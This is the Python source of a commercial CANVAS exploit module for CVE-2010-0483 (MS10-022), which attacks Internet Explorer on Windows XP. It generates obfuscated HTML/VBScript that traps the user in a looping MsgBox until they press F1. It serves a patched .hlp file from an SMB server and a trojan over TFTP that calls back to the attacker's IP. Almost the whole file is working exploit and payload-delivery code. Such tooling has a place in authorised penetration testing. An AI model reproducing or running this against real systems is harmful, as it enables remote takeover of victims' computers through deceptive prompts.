#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside

from smbserver import *
from threading import *
from random import randint
import os.path
from internal import devlog
import canvasengine
import random
from libs.tftpy import *
from libs.canvasos import *


NAME="ie_help"
DESCRIPTION="VBScript MsgBox() function automatically opens HELP files (.hlp) hosted on SMB shares when a user invokes Windows Help via the F1 keyboard shortcut"
VERSION="1.0"

NOTES="""
    Use from httpserver with name ie_help.

    Options are: 
    [message]      - Message of the MessageBox to be displayed to the user
                     default: "Press F1 to stop this"
                     Must not be quoted, spaces are not allowed.

    [title]        - Title of the MessageBox to be displayed to the user
                     default: "Attention!"
                     Must not be quoted, spaces are not allowed.

    [infiniteloop] - True/False, if the MessageBox should be launched 
                     in an infinite loop
                     default: False

    Example: [Arguments:] message:Press_F1! title:Hey infiniteloop=True

    Use as root, need port 443 for SMB incoming connections.

    Commandline usage example:
        sudo ./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ie_help -l 192.168.30.1 -d 5555 -p 80
        ./commandlineInterface.py -v 1 -p 5555

"""

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2010-0483"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0483"
DOCUMENTATION['CVSS'] = 7.6
DOCUMENTATION["CVS URL"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0483"
DOCUMENTATION["Date public"] = "03/01/2010"
DOCUMENTATION["Notes"]=NOTES

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP"]
PROPERTY['MSADV'] = "MS10-022"
PROPERTY['DELIVERY']='HTTP'

#parse_qs moved to urlparse in 2.6, but is only in cgi in 2.5
try:
    from urlparse import parse_qs 
except ImportError:
    devlog("ie_help","Using parse_qs from cgi (Python 2.5)")
    from cgi import parse_qs 
    
import base64
from engine.config import canvas_reports_directory as reportdir




class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="iehelp.html"
        self.share_res="\\help.hlp"
        #self.listenerArgsDict["fromcreatethread"]=1

        self.message = "Press F1 to stop this"
        self.title = "Attention!"
        self.infiniteloop = True #by default, annoy user into clicking

        self.HTTP           = False
        self.SSL            = False
	
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=("Windows XP 32bit",None)

    def run(self):
        self.host=self.target.interface
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self):
        """Makes the html file to start 2nd stage"""

        html="""
            <html>
            <head>
            <title>Loading...</title>
            </head><body onload="loadBody();">
            <script language="javascript">
            """

        jscript = """

                document.write("<script type=\\\"text/vbscript\\\">\\n");
                document.write("help=\\\"\\\\\\\\%s\\\\\\\\a\\\\\\\\help.hlp\\\"\\n")

        """ % self.bindip

        if self.infiniteloop:
            jscript += """
               document.write("While 1\\n")
            """

        jscript += """
                document.write("MsgBox \\\"%s\\\", ,\\\"%s\\\",help,1\\n")
        """ % (self.message,self.title)

        if self.infiniteloop:
            jscript += """
                document.write("Wend\\n")
            """

        jscript += """
                document.write("<\/script>\\n");
        """

        html += self.obfuscate_javascript(jscript)

        html+="""
            </script>
            </body>
            </html>
        """
 
        return html

        
    def neededListenerTypes(self):
        if self.HTTP:
            if self.SSL:
                return [canvasengine.HTTPSMOSDEF]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.WIN32MOSDEF]
     
    def getargs(self):
        self.getarg("infiniteloop")
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #could be spoofed
            self.log("Non IE browser connected - returning None")
            return None,None

        #Get options
        if self.callback:
            self.log("Using callback.ip for bindip: %s"%self.callback.ip)
            self.bindip=self.callback.ip 
        else:
            self.log("Could not figure out callback or bindip - please set bindip to a real IP!")
            return None, None 
	
        if hasattr(self, "clientsideargs"):

            self.HTTP = self.clientsideargs["HTTPMOSDEF"]
            self.SSL = self.clientsideargs["useSSLMOSDEF"]

            for arg in self.clientsideargs["user_supplied_args"]:

                value = self.clientsideargs["user_supplied_args"][arg]
                #print "%s = %s" % (arg,value) # debug

                if arg == "message":
                    self.message = value
                elif arg == "title":
                    self.title = value
                elif arg == "infiniteloop":
                    self.infiniteloop = value in ["True","true"]

        else:
            raise NameError("Can not load options, must be run from httpserver")


        # Set up the tftp server
        tftp = Thread(target=self.set_up_tftp_server)
        tftp.start()

        # Set up the threaded smb server
        smb = Thread(target=self.set_up_smb_server)
        smb.start()
                    
        self.log("Serving evil html")
        sploitstring = self.makefile()
        b.setBody(sploitstring)

        return h,b

    def set_up_smb_server(self):
        """
        Start SMB Server to serve the .hlp file
        """
        self.log("Starting SMB Server on 0.0.0.0:445 to serve the .hlp file")
        mysmb = SMBServer('0.0.0.0', 445)
        mysmb.timeout = 30

        helpfile = os.path.join( self.engine.config["canvas_resources"], "mosdef_callback_tpl.hlp" )

        # Read hlp template
        f = file(helpfile,"rb")
        data = f.read()
        f.close()

        # Patch hlp file with callback ip and random file-name
        replacestr = "111.111.111.111"
        ip = self.callback.ip + " " * (len(replacestr)-len(self.callback.ip))
        data = data.replace(replacestr,ip)

        rnum=random.randint(1000,9999)
        replacestr = "XXXX"
        data = data.replace(replacestr,str(rnum))

        self.log("Setting up hlp file to call back to: %s %d"%(self.callback.ip,self.callback.port))

        mysmb.set_file_data('%s' %(self.share_res), data)
        
        if mysmb.listen()==0:
            self.log("Could not listen on port 445!, are you root?")
            return False
        
        self.log("SMB Server testing loop accepting")

        #wait until state is HALT
        while True :
            if self.state==self.HALT:
                mysmb.close()
                self.log("Halted - closing SMB Thread")
                return True 
            
            mysmb.timeout=3 #3 second timeout
            while mysmb.accept() == 0 and self.state != self.HALT:
                self.log("SMB - Waiting for new client...")
                
            if self.state==self.HALT:
                mysmb.close()
                self.log("Halted - closing SMB Thread")
                return True
            
            while mysmb.handle():
                if self.state==self.HALT:
                    mysmb.close()
                    self.log("Halted - closing SMB Thread")
                    return True
                self.log("SMB - Handled a request.") # Remove this, too noisy

        self.log("Done")
        return True 

    def set_up_tftp_server(self):


        self.log("building the MOSDEF trojan")

        t_os        = canvasos("Windows")
        t_os.arch   = "X86"
        t_os.version   = "XP"

        try:
            self.log("HTTP: %d, SSL: %d" % (self.HTTP,self.SSL))
            mosdeftrojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, http=self.HTTP, ssl=self.SSL)
        except Exception, err:
            self.log("Problem building the MOSDEF trojan: %s"%(err))
            self.setInfo("%s - failed" % (NAME))
            return 0

        self.log("Starting up tftp server")
        myServer = TftpServer(allfiles=self.mosdeftrojan)
        myServer.listen()

        while not self.state == self.HALT:
            self.log("XXX")
            readyinput=myServer.check_sockets()
            myServer.handle_active_sockets()

        return True


        
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    print "This must be run from httpserver"
    exit(0)
    app = theexploit()
    ret=standard_callback_commandline(app)

